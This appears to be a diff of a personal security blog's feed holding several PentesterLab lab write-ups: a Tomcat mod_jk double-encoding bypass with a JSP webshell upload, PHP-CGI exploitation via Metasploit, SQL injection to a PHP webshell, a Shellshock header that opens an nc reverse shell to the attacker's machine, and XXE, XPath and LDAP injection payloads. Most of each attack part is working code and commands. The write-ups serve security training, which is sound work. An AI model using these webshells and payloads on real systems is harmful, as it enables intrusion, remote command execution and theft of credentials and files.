+<p><em>If you provide this %252e to a vulnerable modjk, it will perform a first decoding and send the value %2e to Tomcat. Tomcat will then perform a second decoding to get the value .. If you use %252e%252e, you will then be able to send .. to Tomcat. If you try to send .. directly to Apache, it will not forward the request to Tomcat unless the path resolve to a path configured to be forwarded to Tomcat (using <code>modjk</code>).</em></p>
+
+<p>Now we know how to access the /manager/html, (Sometimes you may need to repeat several times %252e%252e/)</p>
+
+<p><code>http://192.168.79.168/examples/jsp/%252e%252e/%252e%252e/manager/html</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The credentials are one of the default ones. In this exerciese, the admin didn&rsquo;t change the credentials. The user name is admin and password is empty. Once we get it, we are able to get acces to the Tomcat Manager.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now we need to create a webshell and upload it to the Tomcat.</p>
+
+<h4>Deploy a webshell</h4>
+
+<p>webshell (from pentesterlab, you may generate it using msfvenom)</p>
+
+<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='jsp'><span class='line'><span class="nt">&lt;FORM</span> <span class="na">METHOD=</span><span class="s">GET</span> <span class="na">ACTION=</span><span class="s">&#39;index.jsp&#39;</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="nt">&lt;INPUT</span> <span class="na">name=</span><span class="s">&#39;cmd&#39;</span> <span class="na">type=</span><span class="s">text</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="nt">&lt;INPUT</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">&#39;Run&#39;</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="nt">&lt;/FORM&gt;</span>
+</span><span class='line'><span class="k">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&quot;java.io.*&quot;</span> <span class="k">%&gt;</span>
+</span><span class='line'><span class="k">&lt;%</span>
+</span><span class='line'>   <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&quot;cmd&quot;</span><span class="o">);</span>
+</span><span class='line'>   <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="o">;</span>
+</span><span class='line'>   <span class="k">if</span><span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>      <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span><span class='line'>      <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>         <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+</span><span class='line'>         <span class="n">BufferedReader</span> <span class="n">sI</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nf">InputStreamReader</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
+</span><span class='line'>         <span class="k">while</span><span class="o">((</span><span class="n">s</span> <span class="o">=</span> <span class="n">sI</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span> <span class="n">output</span> <span class="o">+=</span> <span class="n">s</span><span class="o">+</span><span class="s">&quot;&lt;/br&gt;&quot;</span><span class="o">;</span> <span class="o">}</span>
+</span><span class='line'>      <span class="o">}</span>  <span class="k">catch</span><span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>   <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>   <span class="o">}</span>
+</span><span class='line'>   <span class="o">}</span>
+</span><span class='line'><span class="k">%&gt;</span>
+</span><span class='line'><span class="nt">&lt;pre&gt;</span><span class="k">&lt;%=</span><span class="n">output</span> <span class="k">%&gt;</span><span class="nt">&lt;/pre&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>now we have to  pack the webshell</p>
+
+<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='jsp'><span class='line'>$ mkdir webshell
+</span><span class='line'>$ cp index.jsp webshell
+</span><span class='line'>
+</span><span class='line'>$ cd webshell
+</span><span class='line'>$ jar -cvf ../webshell.war *
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>webshell <code>webshell.war</code> is ready to fire.</p>
+
+<h4>Upload webshell</h4>
+
+<p>We can use the form to upload war file:
+<img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>However, it will give you a 404 page since the deployment url does not use the double -encoding trick to gain access to get the manager. So we have to use firebug to give the form right location.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>change the location to :</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>After successful uploading webshell, it will show in the Tomcat manager:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now enjoy the webshell by accessing</p>
+
+<p><code>http://192.168.79.168/examples/%252e%252e/webshell/</code></p>
+
+<p> <img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentesterlab--cve-2012-1823]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/30/pentesterlab-cve-2012-1823/"/>
+    <updated>2016-03-30T15:51:10-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/30/pentesterlab-cve-2012-1823</id>
+    <content type="html"><![CDATA[<p><em>All warfare is based on deception. Hence, when we are able to attack, we must seem unable; when using our forces, we must appear inactive; when we are near, we must make the enemy believe we are far away; when far away, we must make him believe we are near.</em> &mdash;&ndash; The Art of War</p>
+
+<p>This course details the exploitation of the PHP CGI bug (CVE-2012-1823) and how an attacker can use it to retrieve arbitrary code and gain code execution on a server using this bug.</p>
+
+<p>Difficluty: 2/5</p>
+
+<!--more-->
+
+
+<h3>Forces:</h3>
+
+<ul>
+<li>Nmap</li>
+<li>NC</li>
+<li>Metasploit</li>
+</ul>
+
+
+<h3>Detail Assessment and Planning</h3>
+
+<ul>
+<li>Port scan to identify opened ports, running services and services version. &mdash;&ndash; Nmap</li>
+<li>Check php version and other http headers. &mdash;&ndash; NC</li>
+<li>Exploit and get the shell. &mdash;&ndash; Metasploit</li>
+</ul>
+
+
+<h3>Waging War</h3>
+
+<h4>Weaknesses and Strengths</h4>
+
+<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>By checking the application HTTP headers with nc, I can get php version.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.1
+</span><span class='line'>Host: 192.168.79.166</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<h4>Attack</h4>
+
+<p>I got the php version is 5.3.3. If I seach this php version&rsquo;s vulnerability., I find that:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>This is may be exploitable. Next I use metasploit to verify that. In msfconsole,</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>search php_cgi</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Only one exploit pops up, which is <code>exploit/multi/http/php_cgi_arg_injection</code></p>
+
+<p>next just set RHOST, LHOST, PAYLOAD I use <code>generic/shell_reverse_tcp</code>. ATTACK!!!</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Done.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentesterlab--From SQL Injection to Shell]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/29/pentesterlab/"/>
+    <updated>2016-03-29T15:16:56-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/29/pentesterlab</id>
+    <content type="html"><![CDATA[<p><em>All warfare is based on deception. Hence, when we are able to attack, we must seem unable; when using our forces, we must appear inactive; when we are near, we must make the enemy believe we are far away; when far away, we must make him believe we are near.</em> &mdash;&ndash; The Art of War</p>
+
+<p>This course details the exploitation of SQL injection in a PHP based website and how an attacker can use it to gain access to the administration pages.</p>
+
+<p>Difficluty: 2/5</p>
+
+<!--more-->
+
+
+<h3>Forces:</h3>
+
+<ul>
+<li>Nmap</li>
+<li>NC</li>
+<li>wfuzz</li>
+<li>sqlmap</li>
+<li>Burp</li>
+<li>webshell</li>
+</ul>
+
+
+<h3>Detail Assessment and Planning</h3>
+
+<ul>
+<li>Port scan to identify opened ports, running services and services version. &mdash;-Nmap</li>
+<li>Check php version and other http headers. &mdash;-NC</li>
+<li>Scan all requests and pages. &mdash;-wfuzz</li>
+<li>SQL injection and get admin password. &mdash;- sqlmap</li>
+<li>Get the php request path. &mdash;-Burp</li>
+<li>Get the web shell &mdash;- webshell</li>
+</ul>
+
+
+<h3>Waging War</h3>
+
+<h4>Weaknesses and Strengths</h4>
+
+<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>By checking the application HTTP headers with nc, I can get php version.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.1
+</span><span class='line'>Host: 192.168.79.165</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The tool wfuzz can be used to detect directories and pages on the web server using brute force.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://192.168.79.165/FUZZ </span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://192.168.79.165/FUZZ.php </span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<h4>Attack</h4>
+
+<p>There is one page I want to try cat.php</p>
+
+<p>In order to upload my websell, one thing I need to do is get admin. I use sqlmap to dump user&rsquo;s information:</p>
+
+<p><code>sqlmap -u " sqlmap -u "http://192.168.79.165/cat.php?id=2" --dump"</code>, after a while, I got this:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like I get the admin&rsquo;s password is P4ssw0rd and md5 hash. I also use John and ripper to verifyed the md5, the result matches P4ssw0rd.</p>
+
+<p>Lets try to login use this password:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>success&hellip;.. keep going.</p>
+
+<p>There is a page can be used to upload new picture.
+<img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Let&rsquo;s try to upload php web shell.</p>
+
+<figure class='code'><figcaption><span>upload1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The result is:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The application filters .php file.</p>
+
+<p>Okay, let&rsquo;s try to change the file name to upload2.php3 with the same code.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>done</p>
+
+<p>Then I want to get the path to that page using Burp</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the shell:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentesterlab--CVE-2014-6271/Shellshock]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/25/pentesterlab-cve2014-6271-slash-shellshock/"/>
+    <updated>2016-03-25T14:40:03-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/25/pentesterlab-cve2014-6271-slash-shellshock</id>
+    <content type="html"><![CDATA[<p><em>So it is said that if you know your enemies and know yourself, you will not be put at risk even if you have a hundred battles.</em> &mdash;&ndash; The Art of War</p>
+
+<p>This vulnerability impacts the Bourne Again Shell &ldquo;Bash&rdquo;. Bash is not usually available through a web application but can be indirectly exposed through a Common Gateway Interface &ldquo;CGI&rdquo;.</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<h3>Forces:</h3>
+
+<ul>
+<li>Nmap</li>
+<li>Burp</li>
+<li>Firebug</li>
+<li>NC</li>
+</ul>
+
+
+<h3>Detail Assessment and Planning</h3>
+
+<ul>
+<li>Port scan to identify opened ports, running services and services version. &mdash;-Nmap</li>
+<li>Identify vulnerability and path <code>/cgi-bin/status</code>. &mdash;-Burp, Firebug</li>
+<li>Exploit shellshock vuln get the reverse shell &mdash;- NC</li>
+</ul>
+
+
+<h3>Waging War</h3>
+
+<h4>Weaknesses and Strengths</h4>
+
+<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/shellshock1.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>By visiting the application with Burp, I can detect that multiple URL are accessed when the page is loaded:</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/shellshock2.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Also by using Firebug, I can identify that CGI page which call system command <code>/cgi-bin/status</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/shellshock3.png" title="[title manually exploit [alt text]]" ></p>
+
+<h4>Attack</h4>
+
+<h5>listen port 443</h5>
+
+<p><code># nc -l -p 443</code></p>
+
+<h5>exploit</h5>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.79.156 443 -e /bin/sh\r\nHost: 192.168.79.164\r\nConnection: close\r\n\r\n" | nc 192.168.79.164 80</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/shellshock5.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.79.156 is the attacker&rsquo;s machine and 192.168.79.164 is victim machine.</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/shellshock6.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentesterlab--Web for Pentester-XML]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/23/pentesterlab-web-for-pentester-xml/"/>
+    <updated>2016-03-23T16:11:36-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/23/pentesterlab-web-for-pentester-xml</id>
+    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerabilities</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<p>OWASP: <a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29">Testing for XML Injection</a></p>
+
+<h3>Example 1</h3>
+
+<p>code review</p>
+
+<figure class='code'><figcaption><span>example1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>  <span class="nv">$xml</span><span class="o">=</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;xml&#39;</span><span class="p">]);</span>
+</span><span class='line'>  <span class="nb">print_r</span><span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$xml</span><span class="p">);</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>XML injection point search:</p>
+
+<p>ZAP add fuzzing file:</p>
+
+<p><code>https://wfuzz.googlecode.com/svn/trunk/wordlist/Injections/XML.txt</code></p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xml/example1.php?xml=&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:////etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></p>
+
+<p><code>!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:////etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code> needed to be encoded.</p>
+
+<h3>Example 2</h3>
+
+<p>code review</p>
+
+<figure class='code'><figcaption><span>example2.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'> <span class="nv">$x</span> <span class="o">=</span> <span class="s2">&quot;&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nv">$xml</span><span class="o">=</span><span class="nb">simplexml_load_string</span><span class="p">(</span><span class="nv">$x</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$xpath</span> <span class="o">=</span> <span class="s2">&quot;users/user/name[.=&#39;&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;]/parent::*/message&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$res</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$xml</span><span class="o">-&gt;</span><span class="na">xpath</span><span class="p">(</span><span class="nv">$xpath</span><span class="p">));</span>
+</span><span class='line'>  <span class="k">while</span><span class="p">(</span><span class="k">list</span><span class="p">(</span> <span class="p">,</span><span class="nv">$node</span><span class="p">)</span> <span class="o">=</span> <span class="nb">each</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">echo</span> <span class="nv">$node</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xml/example2.php?name=' or 1=1]%00</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentesterlab--Web for Pentester-LDAP]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/22/pentesterlab-web-for-pentester-ldap/"/>
+    <updated>2016-03-22T14:56:35-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/22/pentesterlab-web-for-pentester-ldap</id>
+    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerabilities</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<p>What is LDAP injection?</p>
+
+<p>from OWASP:</p>
+
+<p><code>LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.</code></p>
+
+<p>more information:
+<a href="https://www.owasp.org/index.php/LDAP_injection">LDAP injection</a></p>
+
+<h3>Example 1</h3>
+
+<p>from pentesterlab:</p>
+
+<p><code>In this first example, you connect to a LDAP server, using your username and password. In this instance, The LDAP server does not authenticate you, since your credentials are invalid. However, some LDAP servers authorise NULL Bind: if null values are sent, the LDAP server will proceed to bind the connection, and the PHP code will think that the credentials are correct. To get the bind with 2 null values, you will need to completely remove this parameter from the query. If you keep something like username=&amp;password= in the URL, these values will not work, since they won't be null; instead, they will be empty.</code></p>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$ld</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>   <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>     <span class="nv">$user</span> <span class="o">=</span> <span class="s2">&quot;uid=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;ou=people,dc=pentesterlab,dc=com&quot;</span><span class="p">;</span>
+</span><span class='line'>   <span class="p">}</span>
+</span><span class='line'>   <span class="nv">$lb</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ldap_bind</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">]);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer uses function <code>ldap_bind</code> to bind parameters. I can bypass the authentication by setting null values to the parameters.</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/ldap/example1.php</code></p>
+
+<h3>Example 2</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example2.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'>  <span class="nv">$pass</span> <span class="o">=</span> <span class="s2">&quot;{MD5}&quot;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">pack</span><span class="p">(</span><span class="s2">&quot;H*&quot;</span><span class="p">,</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])));</span>
+</span><span class='line'>  <span class="nv">$filter</span> <span class="o">=</span> <span class="s2">&quot;(&amp;(cn=&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;)(userPassword=&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;))&quot;</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our goal here will be to inject inside <code>[INPUT1]</code> (the username parameter). We will need to inject:</p>
+
+<ol>
+<li>The end of the current filter using <code>hacker)</code>.</li>
+<li>An always-true condition <code>((cn=*) for example)</code></li>
+<li>A ) to keep a valid syntax and close the first <code>)</code></li>
+<li><p>A NULL BYTE <code>(%00)</code> to get rid of the end of the filter</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/ldap/example2.php?name=hacker)(cn=*))%00&amp;password=rtrtrtr</code></p>
+
+<p>nmap search LDAP:</p>
+
+<p><code>nmap -p 389 --script ldap-search 192.168.79.162</code></p></li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentestlab--Web for Pentester - Command Injection]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/21/pentestlab-web-for-pentester-command-injection/"/>
+    <updated>2016-03-21T16:46:28-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/21/pentestlab-web-for-pentester-command-injection</id>
+    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerability</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<p>From Pentestlab,</p>
+
+<p><code>Command injection comes from a lack of filtering and encoding of information used as part of a command. The simplest example comes from using the function system (to run commands) and take an HTTP parameter as an argument of this command.</code></p>
+
+<p><code>There are many ways to exploit a command injection:</code></p>
+
+<pre><code>`By redirecting the result of the first command into the second | id`
+`By running another command if the first one succeeds: &amp;&amp; id (where &amp; needs to be encoded)`
+`By running another command if the first one fails (and making sure it does: error || id ` just here to 
+</code></pre>
+
+<h3>Example 1</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
